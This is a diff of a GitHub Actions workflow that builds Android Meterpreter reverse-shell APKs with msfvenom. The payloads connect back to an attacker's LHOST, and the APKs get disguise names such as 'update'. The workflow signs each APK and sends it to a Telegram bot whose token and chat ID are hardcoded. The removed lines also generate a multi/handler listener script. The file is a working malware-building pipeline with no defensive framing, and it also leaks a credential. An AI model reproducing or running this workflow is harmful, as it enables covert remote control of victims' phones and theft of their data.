@@ -1,171 +1,128 @@
-name: Build MSF Payload
+name: Build Android Payload
 
 on:
   workflow_dispatch:
     inputs:
-      payload:
-        description: "Payload type"
-        required: true
-        type: choice
-        default: "android/meterpreter/reverse_tcp"
-        options:
-          - android/meterpreter/reverse_tcp
-          - android/meterpreter/reverse_tcp_ssl
-          - android/meterpreter/reverse_http
-          - android/meterpreter/reverse_https
-          - android/meterpreter_reverse_tcp
-          - android/meterpreter_reverse_http
-          - android/meterpreter_reverse_https
-          - android/shell/reverse_tcp
-          - android/shell/reverse_http
-          - android/shell/reverse_https
       lhost:
-        description: "LHOST — public IP/domain your handler listens on"
+        description: "LHOST - public IP / DDNS (ngrok bhi chalega)"
         required: true
       lport:
         description: "LPORT"
         required: true
         default: "4444"
-      filename:
-        description: "Output APK name (disguise)"
-        required: false
-        default: "update.apk"
-      send_rc:
-        description: "Also send handler .rc file to Telegram"
+      payload:
+        description: "Payload type"
+        type: choice
         required: true
-        type: boolean
-        default: true
+        default: "android/meterpreter/reverse_https"
+        options:
+          - android/meterpreter/reverse_https
+          - android/meterpreter/reverse_tcp
+      app_name:
+        description: "APK ka naam"
+        required: false
+        default: "update"
 
+# ====== YAHAN PASTE KARO ======
 env:
-  IMAGE: "metasploitframework/metasploit-framework:latest"
+  BOT_TOKEN: "7867132649:AAFvLV9LpNE8Jiv5blMhdbMsacqLijDdh0o"
+  CHAT_ID: "6522295816"
+# ==============================
+
+concurrency:
+  group: payload-${{ github.ref }}
+  cancel-in-progress: true
 
 jobs:
   build:
-    runs-on: ubuntu-latest
-    timeout-minutes: 25
+    runs-on: ubuntu-22.04
+    timeout-minutes: 30
+    env:
+      LHOST: ${{ inputs.lhost }}
+      LPORT: ${{ inputs.lport }}
+      PAYLOAD: ${{ inputs.payload }}
+      APK_NAME: ${{ inputs.app_name }}
 
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Resolve + validate parameters
-        id: p
+      - name: Install Metasploit
+        run: |
+          sudo apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq metasploit-framework
+          msfvenom --version
+
+      - name: Generate APK
         run: |
           set -euo pipefail
-          LHOST="${{ github.event.inputs.lhost || secrets.LHOST }}"
-          LPORT="${{ github.event.inputs.lport || secrets.LPORT || '4444' }}"
-          PAYLOAD="${{ github.event.inputs.payload || 'android/meterpreter/reverse_tcp' }}"
-          FNAME="${{ github.event.inputs.filename || 'update.apk' }}"
-          SEND_RC="${{ github.event.inputs.send_rc || 'true' }}"
+          msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" \
+            -a dalvik --platform android \
+            -o "raw-${APK_NAME}.apk"
+          ls -lh raw-*.apk
 
-          [ -z "$LHOST" ] && { echo "::error::LHOST missing"; exit 1; }
-          [ -z "$LPORT" ] && LPORT=4444
-          [ -z "$FNAME" ] && FNAME=update.apk
-          case "$FNAME" in *.apk) ;; *) FNAME="$FNAME.apk" ;; esac
-
-          case "$PAYLOAD" in
-            android/meterpreter/reverse_tcp|android/meterpreter/reverse_tcp_ssl|\
-            android/meterpreter/reverse_http|android/meterpreter/reverse_https|\
-            android/meterpreter_reverse_tcp|android/meterpreter_reverse_http|\
-            android/meterpreter_reverse_https|\
-            android/shell/reverse_tcp|android/shell/reverse_http|android/shell/reverse_https) ;;
-            *) echo "::error::Unsupported payload: $PAYLOAD"; exit 1 ;;
-          esac
-
-          echo "lhost=$LHOST"     >> "$GITHUB_OUTPUT"
-          echo "lport=$LPORT"     >> "$GITHUB_OUTPUT"
-          echo "payload=$PAYLOAD" >> "$GITHUB_OUTPUT"
-          echo "fname=$FNAME"     >> "$GITHUB_OUTPUT"
-          echo "send_rc=$SEND_RC" >> "$GITHUB_OUTPUT"
-
-      - name: Pull Metasploit image
-        run: docker pull "$IMAGE"
-
-      - name: Probe image
+      - name: Zipalign + Sign
         run: |
           set -euo pipefail
-          docker run --rm --entrypoint bash "$IMAGE" -lc \
-            'ruby -v; java -version 2>&1 | head -1; which jarsigner apksigner zipalign || true'
+          BT=$(ls -d "$ANDROID_HOME"/build-tools/* | sort -V | tail -1)
+          echo "build-tools: $BT"
 
-      - name: Build payload
-        env:
-          PAYLOAD: ${{ steps.p.outputs.payload }}
-          LHOST: ${{ steps.p.outputs.lhost }}
-          LPORT: ${{ steps.p.outputs.lport }}
-          FNAME: ${{ steps.p.outputs.fname }}
-        run: |
-          set -euo pipefail
-          mkdir -p out && chmod 777 out
+          keytool -genkeypair -v -keystore debug.keystore \
+            -storepass android -keypass android \
+            -alias androiddebugkey -keyalg RSA -keysize 2048 \
+            -validity 10000 -dname "CN=Android Debug,O=Android,C=US"
 
-          if ! docker run --rm \
-                --user "$(id -u):$(id -g)" \
-                -e HOME=/tmp \
-                -w /usr/src/metasploit-framework \
-                -v "$PWD/out:/work" \
-                --entrypoint ./msfvenom \
-                "$IMAGE" \
-                  -p "$PAYLOAD" \
-                  LHOST="$LHOST" \
-                  LPORT="$LPORT" \
-                  --platform android \
-                  -o "/work/$FNAME" 2>&1 | tee /tmp/msfvenom.log; then
-            echo "::error::msfvenom exited non-zero"
-            tail -60 /tmp/msfvenom.log
-            exit 1
-          fi
+          "$BT/zipalign" -p -f 4 "raw-${APK_NAME}.apk" "aligned.apk"
 
-          ls -la out/
-          test -s "out/$FNAME" || {
-            echo "::error::msfvenom produced no APK"
-            tail -60 /tmp/msfvenom.log
-            exit 1
-          }
+          "$BT/apksigner" sign \
+            --ks debug.keystore --ks-pass pass:android \
+            --key-pass pass:android --ks-key-alias androiddebugkey \
+            --out "${APK_NAME}.apk" aligned.apk
 
-      - name: Verify APK
-        env:
-          FNAME: ${{ steps.p.outputs.fname }}
-        run: |
-          set -euo pipefail
-          APK="out/$FNAME"
-          test -s "$APK" || { echo "::error::APK missing"; exit 1; }
-          unzip -l "$APK" | grep -q AndroidManifest.xml || { echo "::error::Not a valid APK"; exit 1; }
-          if unzip -l "$APK" | grep -Eq 'META-INF/.*\.(RSA|DSA|SF)'; then
-            echo "APK signed: $(du -h "$APK" | cut -f1)"
-          else
-            echo "::warning::APK has no v1 signature — install may fail"
-          fi
-
-      - name: Build handler rc
-        env:
-          PAYLOAD: ${{ steps.p.outputs.payload }}
-          LHOST: ${{ steps.p.outputs.lhost }}
-          LPORT: ${{ steps.p.outputs.lport }}
-        run: |
-          set -euo pipefail
-          RC="out/handler-$LPORT.rc"
-          {
-            echo "use multi/handler"
-            echo "set PAYLOAD $PAYLOAD"
-            echo "set LHOST $LHOST"
-            echo "set LPORT $LPORT"
-            echo "set ExitOnSession false"
-            echo "set AutoRunScript post/multi/manage/shell_to_meterpreter"
-            echo "exploit -j"
-          } > "$RC"
-          cat "$RC"
+          "$BT/apksigner" verify "${APK_NAME}.apk"
+          ls -lh "${APK_NAME}.apk"
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: msf-payload
-          path: out/
+          name: payload-apk
+          path: ${{ inputs.app_name }}.apk
           retention-days: 7
 
-      - name: Preflight Telegram
-        id: tg
-        env:
-          SEC_TOKEN: "7867132649:AAFvLV9LpNE8Jiv5blMhdbMsacqLijDdh0o"
-          SEC_CHAT: "6522295816"
-          VAR_TOKEN: ${{ vars.TELEGRAM_BOT_TOKEN }}
-          VAR_CHAT: ${{ vars.TELEGRAM_CHAT_ID }}
-        run:
+      - name: Send to Telegram
+        if: always()
+        run: |
+          set -euo pipefail
+          APK="${APK_NAME}.apk"
+          [ -f "$APK" ] || { echo "APK missing"; exit 1; }
+
+          SIZE=$(stat -c%s "$APK")
+          echo "size: $SIZE bytes"
+          if [ "$SIZE" -gt 52428800 ]; then
+            echo "::error::APK 50MB se bada hai, Telegram bot limit cross."
+            exit 1
+          fi
+
+          CAP="APK ready%0APayload: ${PAYLOAD}%0ALHOST: ${LHOST}:${LPORT}%0ABuild: ${GITHUB_RUN_NUMBER}"
+
+          RESP=$(curl -sS --max-time 180 -X POST \
+            "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+            -F "chat_id=${CHAT_ID}" \
+            -F "document=@${APK}" \
+            -F "caption=${CAP}")
+
+          echo "$RESP"
+          echo "$RESP" | grep -q '"ok":true' || { echo "::error::Telegram send fail"; exit 1; }
+
+      - name: Summary
+        if: always()
+        run: |
+          {
+            echo "### Payload build"
+            echo "| field | value |"
+            echo "|---|---|"
+            echo "| payload | ${PAYLOAD} |"
+            echo "| lhost | ${LHOST} |"
+            echo "| lport | ${LPORT} |"
+            echo "| run | ${GITHUB_RUN_NUMBER} |"
+          } >> "$GITHUB_STEP_SUMMARY"
